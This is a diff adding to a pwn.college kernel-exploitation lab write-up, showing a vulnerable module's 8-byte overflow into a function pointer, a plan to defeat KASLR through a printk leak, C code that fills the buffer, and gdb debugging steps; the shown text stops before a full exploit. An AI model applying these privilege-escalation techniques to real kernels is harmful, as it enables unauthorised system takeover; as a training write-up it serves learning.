@@ -286,7 +286,7 @@ This means our target is at `device_write`
 ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, loff_t *offset)
 {
   ssize_t v4; // r12
-  $03BF2B29B6BBB97215B935736F34BBB0 logger; // [rsp+0h] [rbp+0h] BYREF
+  logger_t logger; // [rsp+0h] [rbp+0h] BYREF
   unsigned __int64 vars108; // [rsp+108h] [rbp+108h]
 
   vars108 = __readgsqword(0x28u);
@@ -297,7 +297,7 @@ ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, l
     _warn_printk("Buffer overflow detected (%d < %lu)!\n", 264LL);
     BUG();
   }
-  v4 = length - copy_from_user(&logger, buffer);
+  v4 = length - copy_from_user(&logger, buffer, length);
   logger.log_function((const char *)&logger);
   return v4;
 }
@@ -305,3 +305,113 @@ ssize_t __fastcall device_write(file *file, const char *buffer, size_t length, l
 
 This code isn't really much..
 
+Here's the defined structure for `logger_t`
+
+```c
+00000000 struct logger_t // sizeof=0x108
+00000000 {                                       // XREF: device_write/r
+00000000     char buffer[256];
+00000100     int (*log_function)(const char *, ...); // XREF: device_write+2E/w
+00000100                                         // device_write:loc_5E/r
+00000108 };
+```
+
+In short, this function handles writing to `/proc/pwncollege`, it ensures that the length doesn't exceed `0x108` then finally it copies the userspace buffer into the logger structure and executes the function pointer passing the address of the logger variable as the first parameter.
+
+### Exploitation
+
+From our analysis, the kernel module appears to not do much...however, it contains a critical vulnerability.
+
+There is an 8-byte overflow, as the handler allows writing up to 0x108 bytes.
+
+This overflow enables us to overwrite an adjacent function pointer, giving us control over the function that will be executed.
+
+Despite being a single primitive, this bug is sufficient to achieve Local Privilege Escalation (LPE).
+
+One obstacle, however, is that KASLR (Kernel Address Space Layout Randomization) is enabled, meaning kernel addresses are randomized at boot. As a result, we cannot reliably jump to hardcoded kernel addresses.
+
+That said, if we are able to obtain a kernel address leak, we can defeat KASLR by calculating the kernel base address. Once the base is known, we can leverage any useful gadget within the kernel's .text section to construct our exploit.
+
+#### Leaks?
+
+To obtain a kernel leak, I identified two possible approaches:
+- Missing null termination, causing `printk` to read beyond the intended buffer and leak an adjacent kernel pointer.
+- A format string vulnerability, which could be abused to disclose arbitrary kernel memory.
+
+Both approaches rely on retrieving output from the kernel log ring buffer (`dmesg` / `vm logs`). Since `printk` writes directly to the kernel log, any unintended memory disclosure becomes observable from user space provided we have the permission.
+
+In my solution, I chose to exploit the first method. The lack of proper null termination allows `printk` to continue reading into adjacent memory, ultimately leaking a kernel address. This leak is sufficient to recover the randomized kernel base and bypass KASLR.
+
+The kernel pointer after `buf` is the address of the `printk` function.
+
+I'll show how it looks in memory, this is the code I wrote for filling up `buf` with `A's`
+
+```c
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include "log.h"
+
+int main() {
+
+    int fd = open("/proc/pwncollege", O_RDWR);
+    
+    if (fd <= 0) {
+        logErr("Failed to open /proc/pwncollege");
+        exit(1);
+    }
+
+    char payload[0x100] = {0};
+    memset(payload, 'A', sizeof(payload)); 
+    write(fd, payload, sizeof(payload));
+    
+    return 0;
+}
+```
+
+Then compile and transfer it to the filesystem
+
+```bash
+mark@rwx:~/Desktop/Labs/PwnCollege/Kernel/pwnkernel$ musl-gcc leak.c -o leak -static
+mark@rwx:~/Desktop/Labs/PwnCollege/Kernel/pwnkernel$ cp leak fs/
+mark@rwx:~/Desktop/Labs/PwnCollege/Kernel/pwnkernel$
+```
+
+We can then boot the kernel.
+
+Since the `-s` argument was specified in the `qemu` command this would enable remote debugging
+
+![ss](ss.png)
+
+Now we attach to the kernel using `gdb`
+
+![one](gdb_one.png)
+![two](gdb_two.png)
+![three](gdb_three.png)
+
+From this we just need to set a breakpoint at the point where the module is about to call the function pointer
+
+To calculate the address we take the `mod_base + offset`
+
+![modbase](base.png)
+![disasm](disasm.png)
+
+```bash
+gef> b *device_write+89
+Breakpoint 1 at 0xffffffffc0000069: file /tmp/tmpb5xkbd1s/challenge.c, line 78.
+gef> 
+```
+
+Continuing execution and running `./leak` we hit the `breakpoint`
+
+![leak1](leak1.png)
+![leak2](leak2.png)
+
+```bash
+gef> telescope $rdi
+```
